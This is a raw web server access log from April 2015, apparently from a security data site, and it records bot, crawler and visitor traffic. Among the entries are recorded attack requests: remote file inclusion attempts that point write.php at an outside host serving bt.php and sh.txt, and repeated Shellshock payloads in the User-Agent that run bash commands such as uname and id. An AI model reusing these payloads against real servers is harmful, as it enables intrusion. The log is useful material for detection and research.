112.218.68.155 - - [29/Apr/2015:21:28:33 -0700] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
112.218.68.155 - - [29/Apr/2015:21:28:33 -0700] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
112.218.68.155 - - [29/Apr/2015:21:28:35 -0700] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
112.218.68.155 - - [29/Apr/2015:21:28:36 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
112.218.68.155 - - [29/Apr/2015:21:28:38 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
112.218.68.155 - - [29/Apr/2015:21:28:38 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
112.218.68.155 - - [29/Apr/2015:21:28:40 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
178.137.19.143 - - [29/Apr/2015:22:17:47 -0700] "GET / HTTP/1.1" 200 22968 "http://autofore.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.40607)" 
178.137.19.143 - - [29/Apr/2015:22:17:47 -0700] "GET / HTTP/1.1" 200 22968 "http://777s.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; T312461)" 
178.137.19.143 - - [29/Apr/2015:22:17:48 -0700] "GET / HTTP/1.1" 200 22968 "http://autofore.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.40607)" 
178.137.19.143 - - [29/Apr/2015:22:17:48 -0700] "GET / HTTP/1.1" 200 22968 "http://777s.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; T312461)" 
178.137.19.143 - - [29/Apr/2015:22:17:49 -0700] "GET / HTTP/1.1" 200 22968 "http://autofore.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.40607)" 
178.137.19.143 - - [29/Apr/2015:22:17:49 -0700] "GET / HTTP/1.1" 200 22968 "http://777s.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; T312461)" 
82.199.8.106 - - [29/Apr/2015:22:25:42 -0700] "GET /honeypot/Honeypot%2520-%2520Howto.pdf HTTP/1.1" 418 695 "-" "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo 333:; uname -a; echo 333:; id;\"" 
82.199.8.106 - - [29/Apr/2015:22:25:59 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 418 695 "-" "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo 333:; uname -a; echo 333:; id;\"" 
183.26.169.53 - - [29/Apr/2015:22:36:10 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930799 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36" 
54.84.208.177 - - [29/Apr/2015:22:45:37 -0700] "HEAD / HTTP/1.1" 200 295 "-" "Mozilla/6.0 (compatible; MSIE 5.5; Windows NT 6.0)" 
89.65.165.251 - - [29/Apr/2015:22:54:36 -0700] "GET / HTTP/1.1" 200 7041 "http://zaufanatrzeciastrona.pl/post/weekendowa-lektura-2015-04-17-zapraszamy-do-lektury/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
89.65.165.251 - - [29/Apr/2015:22:54:37 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
89.65.165.251 - - [29/Apr/2015:22:54:39 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
94.153.9.66 - - [29/Apr/2015:22:54:57 -0700] "GET / HTTP/1.1" 418 676 "http://krasnodar-split-system.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
94.153.9.66 - - [29/Apr/2015:22:54:58 -0700] "GET / HTTP/1.1" 418 676 "http://krasnodar-split-system.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
94.153.9.66 - - [29/Apr/2015:22:54:58 -0700] "GET / HTTP/1.1" 418 676 "http://krasnodar-split-system.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
104.130.161.117 - - [29/Apr/2015:23:07:28 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
104.130.161.117 - - [29/Apr/2015:23:07:28 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Tornado-Async-Client" 
104.130.161.117 - - [29/Apr/2015:23:07:28 -0700] "GET /honeypot/BSidesDFW... HTTP/1.1" 301 466 "-" "Tornado-Async-Client" 
104.130.161.117 - - [29/Apr/2015:23:07:28 -0700] "GET /honeypot/BSidesDFW... HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
82.199.8.106 - - [29/Apr/2015:23:09:04 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 418 695 "-" "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo 333:; uname -a; echo 333:; id;\"" 
104.130.161.114 - - [29/Apr/2015:23:11:44 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
104.130.161.114 - - [29/Apr/2015:23:11:44 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Tornado-Async-Client" 
104.130.161.114 - - [29/Apr/2015:23:11:44 -0700] "GET /honeypot/BSidesDFW... HTTP/1.1" 301 466 "-" "Tornado-Async-Client" 
104.130.161.114 - - [29/Apr/2015:23:11:44 -0700] "GET /honeypot/BSidesDFW... HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [29/Apr/2015:23:18:33 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
104.130.161.117 - - [29/Apr/2015:23:18:33 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Tornado-Async-Client" 
104.130.161.117 - - [29/Apr/2015:23:18:33 -0700] "GET /honeypot/BSidesDFW HTTP/1.1" 301 460 "-" "Tornado-Async-Client" 
104.130.161.117 - - [29/Apr/2015:23:18:33 -0700] "GET /honeypot/BSidesDFW HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
37.9.62.74 - - [29/Apr/2015:23:18:38 -0700] "GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.0" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
37.9.62.74 - - [29/Apr/2015:23:18:38 -0700] "GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.0" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
66.249.67.160 - - [29/Apr/2015:23:45:15 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.67.8 - - [29/Apr/2015:23:45:15 -0700] "GET / HTTP/1.1" 200 7041 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
82.199.8.106 - - [29/Apr/2015:23:49:08 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 418 695 "-" "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo 333:; uname -a; echo 333:; id;\"" 
104.130.161.114 - - [29/Apr/2015:23:50:21 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
104.130.161.114 - - [29/Apr/2015:23:50:21 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Tornado-Async-Client" 
104.130.161.114 - - [29/Apr/2015:23:50:22 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.114 - - [29/Apr/2015:23:50:22 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
177.231.129.39 - - [30/Apr/2015:00:31:02 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
177.231.129.39 - - [30/Apr/2015:00:31:03 -0700] "GET / HTTP/1.1" 200 7041 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
177.231.129.39 - - [30/Apr/2015:00:31:03 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
177.231.129.39 - - [30/Apr/2015:00:31:04 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
177.231.129.39 - - [30/Apr/2015:00:31:09 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
54.165.154.221 - - [30/Apr/2015:00:31:47 -0700] "GET / HTTP/1.1" 206 4406 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" 
54.165.154.221 - - [30/Apr/2015:00:31:47 -0700] "GET / HTTP/1.1" 206 4387 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" 
54.165.154.221 - - [30/Apr/2015:00:31:47 -0700] "GET / HTTP/1.1" 206 4388 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" 
54.165.154.221 - - [30/Apr/2015:00:31:47 -0700] "GET / HTTP/1.1" 206 4389 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" 
54.165.154.221 - - [30/Apr/2015:00:31:47 -0700] "GET / HTTP/1.1" 206 4389 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" 
54.165.154.221 - - [30/Apr/2015:00:31:47 -0700] "GET / HTTP/1.1" 206 2541 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" 
54.165.154.221 - - [30/Apr/2015:00:31:47 -0700] "GET / HTTP/1.1" 416 523 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" 
37.57.231.112 - - [30/Apr/2015:00:32:50 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 418 695 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
82.199.8.106 - - [30/Apr/2015:00:38:18 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 418 695 "-" "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo 333:; uname -a; echo 333:; id;\"" 
177.231.129.39 - - [30/Apr/2015:00:51:47 -0700] "GET /self.logs/ HTTP/1.1" 200 2596 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
177.231.129.39 - - [30/Apr/2015:00:51:49 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" 
207.46.13.149 - - [30/Apr/2015:01:13:16 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)" 
207.46.13.149 - - [30/Apr/2015:01:13:35 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
37.9.62.74 - - [30/Apr/2015:01:20:00 -0700] "GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.0" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
104.130.161.117 - - [30/Apr/2015:01:20:00 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
37.9.62.74 - - [30/Apr/2015:01:20:00 -0700] "GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.0" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
104.130.161.117 - - [30/Apr/2015:01:20:00 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Tornado-Async-Client" 
104.130.161.117 - - [30/Apr/2015:01:20:00 -0700] "GET /honeypot/BSidesDFW HTTP/1.1" 301 460 "-" "Tornado-Async-Client" 
104.130.161.117 - - [30/Apr/2015:01:20:00 -0700] "GET /honeypot/BSidesDFW HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
82.199.8.106 - - [30/Apr/2015:01:20:55 -0700] "GET /honeypot/Honeypot%2520-%2520Howto.pdf HTTP/1.1" 418 695 "-" "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo 333:; uname -a; echo 333:; id;\"" 
82.199.8.106 - - [30/Apr/2015:01:20:55 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 418 695 "-" "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo 333:; uname -a; echo 333:; id;\"" 
178.137.166.68 - - [30/Apr/2015:01:45:20 -0700] "GET / HTTP/1.1" 200 22968 "http://sexreliz.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; T312461)" 
178.137.166.68 - - [30/Apr/2015:01:45:20 -0700] "GET / HTTP/1.1" 200 22968 "http://sexreliz.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; T312461)" 
178.137.166.68 - - [30/Apr/2015:01:45:21 -0700] "GET / HTTP/1.1" 200 22968 "http://sexreliz.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; T312461)" 
